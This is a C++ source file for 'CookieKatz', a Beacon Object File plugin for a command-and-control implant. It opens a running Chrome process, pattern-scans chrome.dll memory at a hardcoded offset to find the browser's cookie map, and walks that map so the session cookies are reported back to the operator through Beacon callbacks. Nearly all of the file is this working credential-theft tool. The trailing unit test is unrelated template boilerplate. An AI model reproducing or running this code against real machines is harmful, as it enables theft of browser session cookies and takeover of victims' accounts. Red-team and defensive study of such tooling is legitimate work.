#include <Windows.h>
#include "base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#include "ChromeKatz/Process.cpp"
#include "ChromeKatz/Memory.cpp"

extern "C" {
#include "beacon.h"

    //This is important!
    void banner() {
        BeaconPrintf(CALLBACK_OUTPUT, " _____             _    _      _   __      _       \n");
        BeaconPrintf(CALLBACK_OUTPUT, "/  __ \\           | |  (_)    | | / /     | |      \n");
        BeaconPrintf(CALLBACK_OUTPUT, "| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
        BeaconPrintf(CALLBACK_OUTPUT, "| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
        BeaconPrintf(CALLBACK_OUTPUT, "| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
        BeaconPrintf(CALLBACK_OUTPUT, " \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
        BeaconPrintf(CALLBACK_OUTPUT, " By Meckazin                      github.com/Meckazin \n");
    };

    void ConvertToByteArray(uintptr_t value, BYTE* byteArray, size_t size) {
        for (size_t i = 0; i < size; ++i) {
            byteArray[i] = static_cast<BYTE>(value & 0xFF);
            value >>= 8;
        }
    }

    void go(char* args, int len) {
        banner();
        BeaconPrintf(CALLBACK_OUTPUT, "CookieKatz!\n");

        datap parser;
        BeaconDataParse(&parser, args, len);
        DWORD chromePid = (DWORD)BeaconDataInt(&parser);

        HANDLE hChrome;
        if (chromePid != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Targeting the supplied PID: %d\n", chromePid);
            if (!GetChromeHandle(chromePid, &hChrome))
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get handle\n");
                return;
            }
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] No PID specified, searching for Chrome process\n");
            if (!FindCorrectChromePID(&chromePid, &hChrome)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find suitable Chrome process\n");
                return;
            }
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Targeting PID: %d\n", chromePid);
        }

        uintptr_t baseAddress = 0;
        if (!GetRemoteModuleBaseAddress(hChrome, L"chrome.dll", baseAddress))
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find chrome.dll base address!\n");
            CloseHandle(hChrome);
            return;
        }
#if defined(_DEBUG)
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found chrome.dll base address on 0x%p\n", (void*)baseAddress);
#endif
        const uintptr_t offset = 0xBC84B70;
        baseAddress += offset;

#if defined(_DEBUG)
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying to search for pattern 0x%p\n", (void*)baseAddress);
#endif
        const size_t patternSize = sizeof(uintptr_t);
        BYTE pattern[patternSize];

        ConvertToByteArray(baseAddress, pattern, patternSize);

        uintptr_t resultAddress = 0;
        if (!FindPattern(hChrome, pattern, sizeof(pattern), resultAddress)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find the target pattern!\n");
            CloseHandle(hChrome);
            return;
        }
#if defined(_DEBUG)
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Pattern found at address 0x%p\n", (void*)resultAddress);
#endif
        uintptr_t CookieMapOffset = 0x28;
        CookieMapOffset += resultAddress + sizeof(uintptr_t); //Include the length of the result address as well
#if defined(_DEBUG)
        BeaconPrintf(CALLBACK_OUTPUT, "[*] CookieMap should be found in address 0x%p\n", (void*)CookieMapOffset);
#endif
        WalkCookieMap(hChrome, CookieMapOffset);

        CloseHandle(hChrome);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Done\n");
    }
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
    // Run BOF's entrypoint
    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
    bof::runMocked<>(go);
    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif